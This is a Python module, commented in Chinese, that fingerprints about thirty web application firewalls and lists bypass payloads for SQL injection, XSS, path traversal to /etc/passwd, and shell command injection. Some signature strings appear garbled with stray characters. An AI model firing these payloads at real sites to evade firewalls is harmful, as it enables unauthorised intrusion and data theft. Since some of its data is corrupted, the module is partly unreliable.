"""
WAF Detection and Bypass Module
WAF 检测与绕过模块
参考 FLUX v3.0 WAF 检测与绕过实现
支持 40+ 种 WAF 检测和多种绕过技术
"""

import re
import logging
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


@dataclass
class WAFInfo:
    """WAF 信息"""
    name: str
    vendor: str
    bypass_techniques: List[str]
    confidence: float


class WAFDetector:
    """
    WAF 检测器
    
    支持 40+ 种 WAF 检测：
    - 国际 WAF: Cloudflare, AWS WAF, Akamai, Sucuri, Incapsula, ModSecurity, F5, Imperva, etc.
    - 国产 WAF: 阿里云盾, 腾讯云WAF, 华为云WAF, 安全狗, 360, 知道创宇, 安恒, 长亭, 云锁, 卫士等
    """
    
    WAF_SIGNATURES = {
        # 国际 WAF
        'cloudflare': {
            'patterns': [
                r'cloudflare',
                r'__cfduid',
                r'cf-ray',
                r'cloudflare-nginx',
                r'CF-RAY',
            ],
            'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id'],
            'cookies': ['__cfduid'],
        },
        'aws-waf': {
            'patterns': [r'awswaf', r'aws-waf'],
            'headers': ['x-amz-waf-s攻'],
            'cookies': [],
        },
        'akamai': {
            'patterns': [r'akamai', r'akamaighost'],
            'headers': ['akamai-origin-hop', 'akamai-x-cache'],
            'cookies': [],
        },
        'sucuri': {
            'patterns': [r'sucuri', r'sucuri_waf'],
            'headers': ['x-sucuri-id', 'x-sucuri-cache'],
            'cookies': [],
        },
        'incapsula': {
            'patterns': [r'incapsula', r'incident-id'],
            'headers': ['x-cdn', 'x-iinfo'],
            'cookies': ['incap_ses', 'visid_incap_'],
        },
        'modsecurity': {
            'patterns': [r'mod_security', r'modsecurity', r'co 暂时无法完成您的请求'],
            'headers': [],
            'cookies': [],
        },
        'f5-asm': {
            'patterns': [r'f5 big-ip', r'thx for visiting'],
            'headers': ['x-cnection', 'x-pool'],
            'cookies': [],
        },
        'imperva': {
            'patterns': [r'imperva', r'incapsula', r'version Check'],
            'headers': ['x-cdn', 'x-iinfo'],
            'cookies': [],
        },
        'barracuda': {
            'patterns': [r'barracuda', r'you have been blocked'],
            'headers': ['barra_counter_session'],
            'cookies': [],
        },
        'citrix-netscaler': {
            'patterns': [r'netscaler', r'citrix netscaler'],
            'headers': ['ns无悔', 'citrix'],
            'cookies': [],
        },
        'fortiweb': {
            'patterns': [r'fortiweb', r'fortigate'],
            'headers': ['fortigate', 'fortiweb'],
            'cookies': [],
        },
        'palo-alto': {
            'patterns': [r'palo alto', r'pan-os'],
            'headers': [],
            'cookies': [],
        },
        'radware': {
            'patterns': [r'radware', r'alert on this page'],
            'headers': [],
            'cookies': [],
        },
        'sophos': {
            'patterns': [r'sophos', r'sphinx'],
            'headers': [],
            'cookies': [],
        },
        'wordfence': {
            'patterns': [r'wordfence', r'blocked by wordfence'],
            'headers': [],
            'cookies': [],
        },
        'siteground': {
            'patterns': [r'siteground', r'powered by siteground'],
            'headers': [],
            'cookies': [],
        },
        'stackpath': {
            'patterns': [r'stackpath', r'nexusguard'],
            'headers': [],
            'cookies': [],
        },
        'cloudfront': {
            'patterns': [r'cloudfront', r'x-cache'],
            'headers': ['x-amz-cf-id', 'x-cache'],
            'cookies': [],
        },
        
        # 国产 WAF
        'aliyun': {
            'patterns': [
                r'aliyun', r'alibaba',
                r'加密防护', r'waf.aliyun',
                r'apidays Pro',
                r'error_type=InvalidCode',
            ],
            'headers': ['x-swift-error', 'x-swift-requesttime'],
            'cookies': [],
        },
        'tencent-waf': {
            'patterns': [
                r'.tencentyun.',
                r'waf.tencent',
                r'qcloud/waf',
                r'您好，您访问的内容已被告警',
            ],
            'headers': [],
            'cookies': [],
        },
        'huawei-waf': {
            'patterns': [
                r'huawei',
                r'vsclouds',
                r'waf.huawei',
                r'hws-datafe',
            ],
            'headers': [],
            'cookies': [],
        },
        'safedog': {
            'patterns': [
                r'安全狗',
                r'safedog',
                r'waf.safedog',
                r'云御waf',
            ],
            'headers': [],
            'cookies': ['safedog-variable'],
        },
        '360-waf': {
            'patterns': [
                r'360wz',
                r'wangzhan',
                r'360',
                r'您访问的网站',
                r'/?pid=360',
            ],
            'headers': [],
            'cookies': [],
        },
        'jiaka': {
            'patterns': [
                r'知道创宇',
                r'创宇盾',
                r'knownsec',
            ],
            'headers': [],
            'cookies': [],
        },
        'anquanbao': {
            'patterns': [
                r'安恒',
                r'安恒信息',
                r'error_page',
            ],
            'headers': [],
            'cookies': [],
        },
        'changting': {
            'patterns': [
                r'长亭科技',
                r'chanjet',
                r'原生防护',
            ],
            'headers': [],
            'cookies': [],
        },
        'yunsuo': {
            'patterns': [
                r'云锁',
                r'yunsuo',
                r'wp-content/yunsuo',
            ],
            'headers': [],
            'cookies': ['yunsuo_session'],
        },
        'csb': {
            'patterns': [r'webRAY', r'csbhwaf'],
            'headers': [],
            'cookies': [],
        },
        'dynatrace': {
            'patterns': [r'dynatrace', r'dtcookie'],
            'headers': ['dtcookie', 'x-dtpc'],
            'cookies': [],
        },
    }
    
    BLOCK_PATTERNS = [
        r'blocked',
        r'forbidden',
        r'access denied',
        r'request blocked',
        r'ip blocked',
        r'too many requests',
        r'403 forbidden',
        r'405 not allowed',
        r'请输入验证码',
        r'访问异常',
        r'security check',
        r'sqlinjection denied',
        r'xss denied',
    ]
    
    def __init__(self):
        self.detected_wafs: Dict[str, WAFInfo] = {}
        self.current_waf: Optional[str] = None
    
    def detect(self, headers: Dict[str, str], content: str = "", cookies: str = "") -> Optional[str]:
        """
        检测 WAF
        
        Args:
            headers: HTTP 响应头
            content: 响应内容
            cookies: Cookie 字符串
            
        Returns:
            str: 检测到的 WAF 名称，未检测到返回 None
        """
        self.detected_wafs.clear()
        
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        headers_str = str(headers_lower)
        content_lower = content.lower()
        cookies_lower = cookies.lower()
        
        for waf_name, waf_info in self.WAF_SIGNATURES.items():
            score = 0
            matched_patterns = []
            
            for pattern in waf_info.get('patterns', []):
                if re.search(pattern, headers_str, re.IGNORECASE) or \
                   re.search(pattern, content_lower, re.IGNORECASE):
                    score += 2
                    matched_patterns.append(f'pattern:{pattern}')
            
            for header_name in waf_info.get('headers', []):
                if header_name.lower() in headers_lower:
                    score += 3
                    matched_patterns.append(f'header:{header_name}')
            
            for cookie_pattern in waf_info.get('cookies', []):
                if re.search(cookie_pattern, cookies_lower, re.IGNORECASE):
                    score += 3
                    matched_patterns.append(f'cookie:{cookie_pattern}')
            
            if score > 0:
                self.detected_wafs[waf_name] = WAFInfo(
                    name=waf_name,
                    vendor='international' if waf_name.isascii() else 'china',
                    bypass_techniques=[],
                    confidence=min(score / 5.0, 1.0)
                )
                logger.debug(f"WAF detected: {waf_name} (score={score})")
        
        if self.detected_wafs:
            self.current_waf = max(self.detected_wafs.keys(), 
                                  key=lambda x: self.detected_wafs[x].confidence)
            return self.current_waf
        
        return None
    
    def is_blocked(self, status_code: int, headers: Dict, content: str) -> Tuple[bool, str]:
        """
        判断请求是否被阻止
        
        Returns:
            Tuple[bool, str]: (是否阻止, 阻止原因)
        """
        if status_code == 403:
            return True, "403 Forbidden"
        
        if status_code == 429:
            return True, "429 Too Many Requests"
        
        content_lower = content.lower()
        for pattern in self.BLOCK_PATTERNS:
            if re.search(pattern, content_lower, re.IGNORECASE):
                return True, f"Blocked by pattern: {pattern}"
        
        return False, ""
    
    def get_bypass_techniques(self, waf_name: str = None) -> Dict[str, List[str]]:
        """
        获取绕过技术
        
        Args:
            waf_name: WAF 名称，None 则返回当前检测到的 WAF 的绕过技术
        """
        if waf_name is None:
            waf_name = self.current_waf or ''
        
        return WAF_BYPASS_TECHNIQUES.get(waf_name.lower(), {})


class WAFBypass:
    """
    WAF 绕过技术
    """
    
    SQLI_BYPASS = {
        'comment_obfuscation': [
            "'/**/OR/**/1=1",
            "'/*!50000OR*/1=1",
            "'/*!50001OR*/1=1",
            "'OR'1'='1'",
            "'OR 1=1--",
            "'OR 1=1#",
            "admin'--",
            "admin'#",
            "'UNION SELECT--",
            "'UNION ALL SELECT--",
        ],
        'encoding': [
            "%27%20OR%20%271%27%3D%271",
            "%27%20OR%20%271%27%3D%271%23",
            "%25%37%32%25%37%32%25%33%25%33%25%33%25%31",
        ],
        'case_variation': [
            "' Or '1'='1",
            "' oR '1'='1",
            "' OR '1'='1",
            "'Or'1'='1",
            "'or'1'='1",
        ],
        'whitespace_alternatives': [
            "'OR(1=1)",
            "'OR\t(1=1)",
            "'OR\n(1=1)",
            "'OR\x00(1=1)",
            "')OR('1'='1",
        ],
    }
    
    XSS_BYPASS = {
        'encoding': [
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "%3Cimg%20src=x%20onerror=alert(1)%3E",
            "%3Csvg%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/svg%3E",
        ],
        'case_variation': [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<sCrIpT>alert(1)</sCrIpT>",
            "<Script>alert(1)</Script>",
        ],
        'alternative_tags': [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe onload=alert(1)>",
            "<body onload=alert(1)>",
            "<marquee onload=alert(1)>",
        ],
        'polyglots': [
            "'\" onclick=alert(1)//",
            "<script>alert(1)</script>",
            "javascript:alert(1)//",
        ],
    }
    
    LFI_BYPASS = {
        'null_byte': [
            "/etc/passwd%00",
            "/etc/passwd%00.jpg",
            "../../../etc/passwd%00",
            "/etc/passwd\x00",
        ],
        'double_encoding': [
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%5C..%5C..%5CWindows%5Cwin.ini",
        ],
        'path_traversal': [
            "....//....//etc/passwd",
            "..././..././etc/passwd",
            "....\\/....\\/....\\/etc/passwd",
        ],
    }
    
    RCE_BYPASS = {
        'command_injection': [
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "| cat /etc/passwd",
            "; cat /etc/passwd",
            "& cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
        ],
        'encoding': [
            "printf$IFS$9 HOSTNAME",
            "echo${IFS}test",
            "ls${IFS}-la",
        ],
        'printf': [
            "printf${IFS}test",
            "$(printf${IFS}test)",
            "printf${IFS}%s${IFS}test",
        ],
    }


WAF_BYPASS_TECHNIQUES = {
    'cloudflare': WAFBypass.SQLI_BYPASS,
    'aliyun': WAFBypass.SQLI_BYPASS,
    'tencent-waf': WAFBypass.SQLI_BYPASS,
    'generic': {
        'sqli': WAFBypass.SQLI_BYPASS,
        'xss': WAFBypass.XSS_BYPASS,
        'lfi': WAFBypass.LFI_BYPASS,
        'rce': WAFBypass.RCE_BYPASS,
    }
}


def detect_waf(headers: Dict[str, str], content: str = "", cookies: str = "") -> Optional[str]:
    """
    便捷函数：检测 WAF
    """
    detector = WAFDetector()
    return detector.detect(headers, content, cookies)
